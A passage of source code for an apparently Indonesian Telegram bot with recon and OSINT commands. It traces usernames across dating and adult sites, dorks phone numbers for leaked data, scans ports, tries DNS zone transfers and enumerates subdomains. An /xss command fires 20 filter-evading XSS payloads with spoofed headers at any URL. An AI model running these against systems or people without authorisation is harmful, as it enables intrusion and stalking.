        { name: "Lichess", url: `https://lichess.org/@/${username}` },
        { name: "eBay", url: `https://www.ebay.com/usr/${username}` },
        { name: "HubPages", url: `https://hubpages.com/@${username}` },
        { name: "Instructables", url: `https://www.instructables.com/member/${username}` },
        { name: "DailyMotion", url: `https://www.dailymotion.com/${username}` },
        { name: "Giphy", url: `https://giphy.com/channel/${username}` },
        { name: "Imgur", url: `https://imgur.com/user/${username}` },
        { name: "Bugcrowd", url: `https://bugcrowd.com/${username}` },
        { name: "HackerOne", url: `https://hackerone.com/${username}` },
        { name: "BuyMeACoffee", url: `https://www.buymeacoffee.com/${username}` },
        { name: "Ko-fi", url: `https://ko-fi.com/${username}` },
        { name: "Snapchat", url: `https://www.snapchat.com/add/${username}` },
        { name: "OkCupid", url: `https://www.okcupid.com/profile/${username}` },
        { name: "Bumble", url: `https://bumble.com/app/profile/${username}` },
        { name: "Tinder", url: `https://tinder.com/@${username}` },
        { name: "VSCO", url: `https://vsco.co/${username}` },
        { name: "Foursquare", url: `https://foursquare.com/${username}` },
        { name: "DeviantArt", url: `https://www.deviantart.com/${username}` },
        { name: "Mixcloud", url: `https://www.mixcloud.com/${username}/` },
        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
        { name: "Xvideos", url: `https://www.xvideos.com/profiles/${username}` },
        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
        { name: "Fansly", url: `https://fansly.com/${username}` },
        { name: "CashApp", url: `https://cash.app/$${username}` },
        { name: "Venmo", url: `https://venmo.com/${username}` },
        { name: "Paypal", url: `https://www.paypal.com/paypalme/${username}` },
        { name: "Skype", url: `https://web.skype.com/share?url=${username}` },
        { name: "Interpals", url: `https://www.interpals.net/${username}` },
        { name: "Couchsurfing", url: `https://www.couchsurfing.com/people/${username}` },
        { name: "Duolingo", url: `https://www.duolingo.com/profile/${username}` },
        { name: "Discord", url: `https://discord.id/user/${username}` },
        { name: "Bitbucket", url: `https://bitbucket.org/${username}/` },
        { name: "AngelList", url: `https://angel.co/u/${username}` },
        { name: "Houzz", url: `https://www.houzz.com/user/${username}` },
        { name: "Polygon", url: `https://www.polygon.com/users/${username}` },
        { name: "Vicky", url: `https://www.viki.com/users/${username}/about` },
        { name: "Crunchyroll", url: `https://www.crunchyroll.com/user/${username}` },
        { name: "BandLab", url: `https://www.bandlab.com/${username}` },
        { name: "Canva", url: `https://www.canva.com/${username}` },
        { name: "Adobe", url: `https://www.behance.net/${username}` },
        { name: "SlideShare", url: `https://www.slideshare.net/${username}` },
        { name: "Issuu", url: `https://issuu.com/${username}` },
        { name: "Scribd", url: `https://www.scribd.com/${username}` },
        // Indo & SE Asia Platforms (Focus User Request)
        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
        { name: "Blogger", url: `https://${username}.blogspot.com` },
        { name: "WordPress", url: `https://${username}.wordpress.com` },
        { name: "MobileLegends", url: `https://m.mobilelegends.com/en/search/user?keyword=${username}` },
        { name: "Detik", url: `https://news.detik.com/search?query=${username}` },
        { name: "Kaskus Jual Beli", url: `https://www.kaskus.co.id/fjb/user/${username}` },
        { name: "Bukalapak", url: `https://www.bukalapak.com/u/${username}` },
        { name: "Tokopedia", url: `https://www.tokopedia.com/people/${username}` },
        { name: "Traveloka", url: `https://www.traveloka.com/en-id/user/${username}` },
        { name: "Kulina", url: `https://kulina.id/@${username}` },
        { name: "Bstation", url: `https://www.bilibili.tv/en/space/${username}` },
        { name: "Shopee", url: `https://shopee.co.id/${username}` }
      ];

      // Platforms known to return soft 404s (200 OK but page says not found) or block bots aggressively.
      // We will flag these as "Proteksi/Perlu Cek Manual" to improve accuracy instead of falsely claiming "DITEMUKAN".
      const soft404Platforms = ['Instagram', 'TikTok', 'YouTube', 'Facebook', 'Twitter', 'Snapchat', 'Tinder', 'Bumble', 'OkCupid', 'Spotify'];

      // To avoid overwhelming constraints, process in chunks or concurrently
      const results = await Promise.all(platforms.map(async (platform) => {
        try {
          // Increase accuracy: actually fetch text for some, but fallback to status to avoid huge payload
          const response = await fetchWithTimeout(platform.url, { 
            method: "HEAD",
            headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              "Accept": "text/html,application/xhtml+xml"
            }
          }, 4500); // 4.5 seconds timeout
          
          let found = false;
          let status = response.status;
          
          if (status === 200 || status === 301 || status === 302) {
            found = true;
          }

          if (soft404Platforms.includes(platform.name)) {
            // Force these to be manual check / protested because HEAD requests on these almost always yield false positives
            found = false; 
            status = 403; // Simulate blocked
          }

          return { name: platform.name, found, status, url: platform.url };
        } catch (err) {
          return { name: platform.name, found: false, status: "error", url: platform.url };
        }
      }));

      const foundList = results.filter(r => r.found);
      const blockedList = results.filter(r => r.status === 403 || r.status === 429);
      const notFoundList = results.filter(r => !r.found && r.status !== 403 && r.status !== 429);

      let replyText = `<b>🎯 DIGITAL FOOTPRINT ANALYSIS: @${username}</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n\n`;
      
      if (foundList.length > 0) {
        replyText += `🟢 <b>DITEMUKAN (${foundList.length} PLATFORM)</b>\n`;
        foundList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a>\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a>)\n$/, "\n└ $1\n"); // Fix last icon
      }

      if (blockedList.length > 0) {
        replyText += `\n🟡 <b>PROTECTED / MANUAL CHECK (${blockedList.length})</b>\n`;
        blockedList.forEach(r => replyText += `├ <a href="${r.url}">${r.name}</a> ⚠️\n`);
        replyText = replyText.replace(/\n├ (<a href="[^"]+">[^<]+<\/a> ⚠️)\n$/, "\n└ $1\n");
      }

      replyText += `\n❌ <b>TIDAK DITEMUKAN (${notFoundList.length} PLATFORM)</b>\n`;
      if (notFoundList.length > 0) {
        replyText += `└ <i>Antara lain: ${notFoundList.map(r => r.name).slice(0, 5).join(', ')}...</i>\n`;
      }
      
      replyText += `━━━━━━━━━━━━━━━━━━━━\n` +
                   `✅ <i>Digital footprint scan complete.</i>`;

      ctx.reply(replyText, { link_preview_options: { is_disabled: true }, parse_mode: 'HTML' });
    });

    bot.command('mac', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /mac [MAC_ADDRESS]");
      try {
        const res = await fetch(`https://api.macvendors.com/${args[1]}`);
        if(res.status === 200) {
          const vendor = await res.text();
          const reply = `<b>🔌 MAC VENDOR LOOKUP</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `🆔 <b>MAC:</b> <code>${args[1]}</code>\n` +
                        `🏢 <b>VENDOR:</b> <code>${vendor}</code>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query data berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Tidak ditemukan vendor (atau rate limited).");
        }
      } catch (e) { ctx.reply("❌ Error fetching MAC info."); }
    });

    bot.command('headers', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /headers [url]");
      let url = args[1];
      if(!url.startsWith('http')) url = 'http://' + url;
      try {
        const res = await fetchWithTimeout(url, { method: 'HEAD' }, 4000);
        let hdrs = '';
        res.headers.forEach((v, k) => hdrs += `├ ${k}: ${v}\n`);
        const reply = `<b>🛡️ HTTP SECURITY HEADERS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `💎 <b>TARGET:</b> <code>${url}</code>\n\n` +
                      `📋 <b>HEADERS DATA:</b>\n` +
                      `<pre>${hdrs.substring(0,3800)}</pre>` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch (e) { ctx.reply("❌ Error fetching headers."); }
    });

    bot.command('dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /dork [keyword]");
      const q = encodeURIComponent(args);
      const reply = `<b>🔍 GOOGLE DORKS GENERATOR</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>KEYWORD:</b> <code>${args}</code>\n\n` +
                    `├ 📦 <b>Listing:</b> <a href="https://www.google.com/search?q=intitle:%22index+of%22+${q}">Cek Direktori</a>\n` +
                    `├ 📄 <b>Files:</b> <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen</a>\n` +
                    `├ 👤 <b>Login:</b> <a href="https://www.google.com/search?q=inurl:login+${q}">Cari Form Login</a>\n` +
                    `├ 🐞 <b>SQL:</b> <a href="https://www.google.com/search?q=${q}+%22sql+syntax%22">SQL Error Dork</a>\n` +
                    `└ 🎥 <b>CCTV:</b> <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari Open Camera</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `✅ <i>Dorking links generated.</i>`;
      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('bininfo', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /bininfo [BIN]");
      try {
        const res = await fetch(`https://data.handyapi.com/bin/${args[1]}`);
        const data = await res.json();
        if(data && data.Status === 'SUCCESS') {
          const reply = `<b>💳 CREDIT CARD BIN INFO</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>BIN:</b> <code>${args[1]}</code>\n\n` +
                        `├ 📂 TYPE: ${data.Scheme} (${data.Type})\n` +
                        `├ 🔝 TIER: ${data.CardTier}\n` +
                        `├ 📍 NEGARA: ${data.Country.Name}\n` +
                        `└ 🏦 BANK: ${data.Issuer}\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query BIN berhasil.</i>`;
          ctx.reply(reply, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Data BIN tidak ditemukan.");
        }
      } catch(e) { ctx.reply("❌ Gagal mengecek BIN."); }
    });

    bot.command('subdomain', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /subdomain [domain.com]");
      let domain = args[1].replace(/^https?:\/\//, '').replace(/^www\./, '');
      try {
        ctx.reply(`🔍 Menggali data SSL/TLS topology untuk <b>${domain}</b> (Stealth crt.sh mode)...\nMohon tunggu.`, {parse_mode: 'HTML'});
        const res = await fetchWithTimeout(`https://crt.sh/?q=%.${domain}&output=json`, {}, 25000);
        const data = await res.json();
        
        let subdomains = new Set<string>();
        data.forEach((entry: any) => {
           if (entry.name_value) {
               entry.name_value.split('\n').forEach((sub: string) => {
                   let cleanSub = sub.trim().toLowerCase();
                   if (!cleanSub.includes('*')) subdomains.add(cleanSub);
               });
           }
        });

        const subs = Array.from(subdomains).slice(0, 40);

        if(subs.length > 0) {
          const reply = `<b>🌐 SUBDOMAIN RECON MAPPING (STEALTH)</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>TARGET:</b> <code>${domain}</code>\n\n` +
                        `📋 <b>FOUND SUBS (Top 40):</b>\n` +
                        subs.map((s, idx) => `${idx === subs.length - 1 ? '└' : '├'} <code>${s}</code>`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Reconnaissance selesai. ${subdomains.size > 40 ? `(Ditemukan total ${subdomains.size} subs)` : ''}</i>`;
          ctx.reply(reply, {parse_mode: 'HTML'});
        } else { ctx.reply("❌ Tidak ada subdomain ditemukan dalam database certificate transparency."); }
      } catch(e: any) { 
        ctx.reply(`❌ Gagal mencari subdomain.\n<code>${e.message}</code>`, {parse_mode: 'HTML'}); 
      }
    });

    bot.command('reverseip', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /reverseip [IP_atau_Domain]");
      let target = args[1];
      try {
        ctx.reply(`🔍 Sedang menganalisa Reverse IP Lookup untuk <b>${target}</b>...`, {parse_mode: 'HTML'});
        const res = await fetchWithTimeout(`https://api.hackertarget.com/reverseiplookup/?q=${target}`, {}, 15000);
        const text = await res.text();
        if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
        const lines = text.split('\n').filter(l => l.trim().length > 0);
        if(lines.length > 0) {
          const reply = `<b>🕸️ REVERSE IP LOOKUP</b>\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n` +
                        `💎 <b>TARGET:</b> <code>${target}</code>\n\n` +
                        `📋 <b>FOUND DOMAINS:</b>\n` +
                        lines.slice(0, 30).map((s, idx, arr) => `${idx === arr.length - 1 ? '└' : '├'} <code>${s}</code>`).join('\n') +
                        `\n━━━━━━━━━━━━━━━━━━━━\n` +
                        `✅ <i>Query selesai. ${lines.length > 30 ? '(Dibatasi 30 hasil)' : ''}</i>`;
          ctx.reply(reply, {parse_mode: 'HTML'});
        } else { ctx.reply("❌ Tidak ada domain lain ditemukan di IP ini."); }
      } catch(e: any) { ctx.reply(`❌ Gagal Reverse IP: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('asn', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /asn [IP_atau_AS_Num]");
      let target = args[1];
      try {
        ctx.reply(`🔍 Mencari detail Autonomous System untuk <b>${target}</b>...`, {parse_mode: 'HTML'});
        const res = await fetchWithTimeout(`https://api.hackertarget.com/aslookup/?q=${target}`, {}, 15000);
        const text = await res.text();
        if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
        ctx.reply(`<b>🏢 ASN / BGP OSINT</b>\n━━━━━━━━━━━━━━━━━━━━\n<pre>${text}</pre>`, {parse_mode: 'HTML'});
      } catch(e: any) { ctx.reply(`❌ Gagal Lookup ASN: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('zonetransfer', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if(args.length < 2) return ctx.reply("Format: /zonetransfer [Domain]");
        try {
            ctx.reply(`🔍 Mencoba DNS Zone Transfer (AXFR) pada nameserver <b>${args[1]}</b>...`, {parse_mode: 'HTML'});
            const res = await fetchWithTimeout(`https://api.hackertarget.com/zonetransfer/?q=${args[1]}`, {}, 20000);
            const text = await res.text();
            if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
            ctx.reply(`<b>🌍 DNS ZONE TRANSFER AUDIT</b>\n━━━━━━━━━━━━━━━━━━━━\n<pre>${text.substring(0, 3500)}</pre>`, {parse_mode: 'HTML'});
        } catch(e: any) { ctx.reply(`❌ Gagal Zone Transfer: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('httpheaders', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if(args.length < 2) return ctx.reply("Format: /httpheaders [Domain/URL]");
        try {
            ctx.reply(`🔍 Menganalisa HTTP Headers & Server Banner <b>${args[1]}</b>...`, {parse_mode: 'HTML'});
            const res = await fetchWithTimeout(`https://api.hackertarget.com/httpheaders/?q=${args[1]}`, {}, 15000);
            const text = await res.text();
            if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
            ctx.reply(`<b>🛡️ HTTP HEADERS & WAF</b>\n━━━━━━━━━━━━━━━━━━━━\n<pre>${text.substring(0, 3500)}</pre>`, {parse_mode: 'HTML'});
        } catch(e: any) { ctx.reply(`❌ Gagal mengambil headers: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('traceroute', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if(args.length < 2) return ctx.reply("Format: /traceroute [IP/Domain]");
        try {
            ctx.reply(`🗺️ Melakukan MTR Traceroute ke <b>${args[1]}</b> (Membutuhkan 10-20 Detik)...`, {parse_mode: 'HTML'});
            const res = await fetchWithTimeout(`https://api.hackertarget.com/mtr/?q=${args[1]}`, {}, 30000);
            const text = await res.text();
            if (text.includes('error') || text.includes('API count exceeded')) throw new Error(text);
            ctx.reply(`<b>🛣️ TRACEROUTE & HOP GEO-IP</b>\n━━━━━━━━━━━━━━━━━━━━\n<pre>${text.substring(0, 3500)}</pre>`, {parse_mode: 'HTML'});
        } catch(e: any) { ctx.reply(`❌ Gagal Traceroute: \n<code>${e.message}</code>`, {parse_mode: 'HTML'}); }
    });

    bot.command('github_user', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /github_user [username]");
      try {
        const res = await fetch(`https://api.github.com/users/${args[1]}`);
        if(res.status !== 200) return ctx.reply("❌ User tidak ditemukan.");
        const d = await res.json();
        const reply = `<b>🐙 GITHUB OSINT ANALYTICS</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `👤 <b>USER:</b> <code>${d.login}</code>\n\n` +
                      `├ <b>Name:</b> ${d.name || '-'}\n` +
                      `├ <b>Bio:</b> ${d.bio || '-'}\n` +
                      `├ <b>Location:</b> ${d.location || '-'}\n` +
                      `├ <b>Company:</b> ${d.company || '-'}\n` +
                      `├ <b>Repos:</b> ${d.public_repos} (Public)\n` +
                      `├ <b>Followers:</b> ${d.followers}\n` +
                      `├ <b>Created:</b> ${new Date(d.created_at).toISOString().split('T')[0]}\n` +
                      `└ <b>Link:</b> <a href="${d.html_url}">Visit Profile</a>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `✅ <i>Metadata extraction complete.</i>`;
        ctx.reply(reply, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } });
      } catch(e) { ctx.reply("❌ Error fetching GitHub data."); }
    });

    bot.command('port', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /port [ip]");
      const ip = args[1];
      const commonPorts = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080];
      
      const msg = await ctx.reply(`<i>🔄 Menjalankan Port Scanner (Top 10 TCP) pada <b>${ip}</b>...</i>`, {parse_mode: 'HTML'});
      
      let results: string[] = [];
      let scanned = 0;
      
      const checkPort = (port: number) => {
        return new Promise<void>((resolve) => {
          const socket = new net.Socket();
          socket.setTimeout(2000);
          socket.on('connect', () => { results.push(`├ PORT ${port}: ✅ OPEN`); socket.destroy(); resolve(); });
          socket.on('timeout', () => { results.push(`├ PORT ${port}: ❌ CLOSED/FILTERED`); socket.destroy(); resolve(); });
          socket.on('error', () => { results.push(`├ PORT ${port}: ❌ CLOSED`); socket.destroy(); resolve(); });
          socket.connect(port, ip);
        });
      };

      for (let port of commonPorts) {
        await checkPort(port);
      }

      const reply = `<b>🔌 BASIC TCP PORT SCAN</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `💎 <b>TARGET:</b> <code>${ip}</code>\n\n` +
                    `${results.join('\n')}\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, reply, { parse_mode: 'HTML' });
    });

    bot.command('phone_dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("⚠️ Format: /phone_dork [nomor_hp]");
      const numInfo = args.replace(/\D/g, '');
      const numID = numInfo.startsWith('0') ? '62' + numInfo.substring(1) : numInfo;
      
      let prefix = "";
      if (numInfo.startsWith('628')) {
        prefix = '08' + numInfo.substring(3, 5);
      } else if (numInfo.startsWith('08')) {
        prefix = numInfo.substring(0, 4);
      } else if (numInfo.startsWith('8')) {
        prefix = '08' + numInfo.substring(1, 3);
      }

      const telkomsel = ["0811", "0812", "0813", "0821", "0822", "0823", "0851", "0852", "0853"];
      const indosat = ["0814", "0815", "0816", "0855", "0856", "0857", "0858"];
      const xl = ["0817", "0818", "0819", "0859", "0877", "0878"];
      const axis = ["0831", "0832", "0833", "0838"];
      const tri = ["0895", "0896", "0897", "0898", "0899"];
      const smartfren = ["0881", "0882", "0883", "0884", "0885", "0886", "0887", "0888", "0889"];

      let carrier = "Unknown Carrier";
      let brand = "Lokal / Satelit / Internasional";
      let logo = "👤";

      if (telkomsel.includes(prefix)) { carrier = "Telkomsel"; brand = "Loop/Kartu AS/SimPATI/By.U"; logo = "🔴"; }
      else if (indosat.includes(prefix)) { carrier = "Indosat Ooredoo"; brand = "IM3/Mentari"; logo = "🟡"; }
      else if (xl.includes(prefix)) { carrier = "XL Axiata"; brand = "XL/Prioritas"; logo = "🔵"; }
      else if (axis.includes(prefix)) { carrier = "Axis Axiata"; brand = "Axis"; logo = "🟣"; }
      else if (tri.includes(prefix)) { carrier = "Three (3)"; brand = "Tri"; logo = "🟢"; }
      else if (smartfren.includes(prefix)) { carrier = "Smartfren"; brand = "Smartfren"; logo = "💗"; }


      const reply = `<b>📱 ADVANCED PHONE OSINT</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `🎯 <b>Target:</b> <code>${args}</code>\n` +
                    `🌐 <b>Int. Format:</b> <code>+${numID}</code>\n` +
                    `📶 <b>Provider:</b> ${logo} ${carrier} (${prefix})\n` +
                    `📝 <b>Brand:</b> ${brand}\n\n` +
                    `🔍 <b>INTELLIGENCE DORKS</b>\n` +
                    `├ 📦 <a href="https://www.truecaller.com/search/global/${numID}">Truecaller Identity (Caller ID)</a>\n` +
                    `├ 💬 <a href="https://wa.me/${numID}">WhatsApp Profile Check</a>\n` +
                    `├ 📎 <a href="https://t.me/+${numID}">Telegram Account Search</a>\n` +
                    `├ 🚨 <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22+AND+(leak+OR+db+OR+dump+OR+password+OR+database)">Database Leaks Audit</a>\n` +
                    `├ 📊 <a href="https://www.google.com/search?q=site:*.id+ext:xlsx+OR+ext:pdf+OR+ext:txt+%22${args}%22">Spreadsheet Leaks (.xlsx)</a>\n` +
                    `└ 📝 <a href="https://www.google.com/search?q=site:pastebin.com+OR+site:paste.ee+OR+site:ghostbin.co+%22${args}%22">Pastebin Logs Search</a>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `⚠️ <i>Info: Gunakan GetContact (Apps) untuk hasil tags penamaan terbaik pada target lokal.</i>`;

      ctx.reply(reply, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
    });

    bot.command('qr', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /qr [text/url]");
      ctx.replyWithPhoto(`https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(args)}`);
    });

    bot.command('shortlink', async (ctx) => {
      const args = ctx.message.text.split(' ')[1];
      if(!args) return ctx.reply("Format: /shortlink [url]");
      let url = args; if(!url.startsWith('http')) url = 'https://' + url;
      try {
        const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
        const data = await res.json();
        const reply = `<b>🔗 URL SHORTENING (is.gd)</b>\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n` +
                      `📋 <b>ORIGINAL:</b> <code>${url}</code>\n` +
                      `✨ <b>RESULT:</b> <code>${data.shorturl || "Error"}</code>\n` +
                      `━━━━━━━━━━━━━━━━━━━━`;
        ctx.reply(reply, { parse_mode: 'HTML' });
      } catch(e) { ctx.reply("❌ Error shortening link."); }
    });

    bot.command('xss', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) {
        return ctx.reply("❌ Format salah! Gunakan: /xss [URL]\nContoh: /xss https://example.com/search?q=");
      }
      
      let targetUrl = args[1];
      if (!targetUrl.startsWith('http')) {
         targetUrl = 'http://' + targetUrl;
      }
    
      const msgInfo = await ctx.reply(`🔍 <b>XSS VULNERABILITY SCANNER (STEALTH & WAF BYPASS)</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n🕵️‍♂️ <i>Spoofing User-Agents & Bypassing WAFs...</i>\n⏳ <i>Memulai fuzzing dengan 20 advanced payloads... Mohon tunggu (~10-20 detik).</i>`, {parse_mode: 'HTML'});
      
      // Advance Stealth Payloads for WAF Bypass
      const payloads = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=confirm(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
        "\"<svg/onload=alert(1)//",
        "<img/src=x/onerror=al\\u0065rt(1)>",
        "<a href=\"j%0A%0Davascript:alert(1)\">Click</a>",
        "<math><x href=\"javascript:alert(1)\">click</x></math>",
        "\"<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<<script>alert(1);//<</script>",
        "\"><script src=data:&comma;alert(1)//",
        "<form><button formaction=\"javascript:alert(1)\">X</button></form>",
        "<style>@import'javascript:alert(1)';</style>",
        "<body onpageshow=alert(1)>",
        "\"><script>alert(String.fromCharCode(49))</script>",
        "<a href=\"javas%09cript:alert(1)\">Click</a>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
        "<details/open/ontoggle=\"alert(1)\">",
        "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
        "\"><a href=\"javascript&colon;alert(1)\">Click</a>",
        "'-alert(1)-'",
        "\" autofocus onfocus=alert(1)//",
        "<object data=\"javascript:alert(1)\">"
      ];
      
      const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
      ];
    
      let vulnFound = 0;
      let results = "";
      
      try {
          const promises = payloads.map(async (p, idx) => {
              try {
                 const testUrl = targetUrl + encodeURIComponent(p);
                 const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
                 const response = await axios.get(testUrl, { 
                     timeout: 6000, 
                     validateStatus: () => true,
                     headers: {
                        'User-Agent': ua,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'X-Forwarded-For': '127.0.0.1', // WAF Bypass spoof IP
                        'Cache-Control': 'max-age=0'
                     }
                 });
                 const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
                 
                 // Smart validation for reflection
                 if (body && body.includes(p)) {
                    vulnFound++;
                    results += `[${idx+1}] 🛑 <b>Payload Reflected!</b>\n🪲 <code>${p.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/&/g, '&amp;')}</code>\n`;
                 }
              } catch (err) {
                 // Ignore errors
              }
          });
          
          await Promise.all(promises);
      } catch (e) {
          // Fallback if request totally fails
      }
    
      let finalMsg = `🔍 <b>ADVANCED XSS SCAN REPORT</b>\n━━━━━━━━━━━━━━━━━━━━\n🎯 <b>Target:</b> <code>${targetUrl}</code>\n`;
      finalMsg += `🧪 <b>Payloads Tested:</b> 20 (WAF Evasion)\n⚠️ <b>Vulnerabilities Found:</b> ${vulnFound}\n\n`;
      
      if (vulnFound > 0) {
         finalMsg += `<b>🚨 Reflected Payloads:</b>\n${results}\n`;
         finalMsg += `💡 <i>Sistem mendeteksi payload ter-reflect di dalam response body tanpa sanitasi/escaping. Hal ini berpotensi mengeksekusi kode JavaScript arbitrer di browser pengguna.</i>`;
      } else {
         finalMsg += `✅ <b>Target tampaknya AMAN dari XSS Reflection.</b>\n`;
         finalMsg += `🛡️ <i>WAF (Web Application Firewall) atau filter backend memblokir/mensanitasi 20 Payload Advanced.</i>`;
      }
      
      ctx.telegram.editMessageText(ctx.chat.id, msgInfo.message_id, undefined, finalMsg, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }}).catch(()=>{});
    });

    bot.command('pwd', (ctx) => {
      const p = ctx.message.text.split(' ')[1];
      let len = parseInt(p) || 12;
      if(len > 64) len = 64; if(len < 4) len = 4;
      const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
      let retVal = "";
      for (let i = 0; i < len; ++i) { retVal += charset.charAt(Math.floor(Math.random() * charset.length)); }
      const reply = `<b>🔑 SECURE PASSWORD GEN</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `📏 <b>Length:</b> ${len} chars\n` +
                    `✨ <b>Result:</b> <code>${retVal}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64enc', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64enc [text]");
      const result = Buffer.from(args).toString('base64');
      const reply = `<b>🔤 BASE64 ENCODER</b>\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n` +
                    `<code>${result}</code>\n` +
                    `━━━━━━━━━━━━━━━━━━━━`;
      ctx.reply(reply, {parse_mode: 'HTML'});
    });

    bot.command('b64dec', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64dec [text]");
      try { 
        const result = Buffer.from(args, 'base64').toString('utf8');
        const reply = `<b>🔤 BASE64 DECODER</b>\n` +
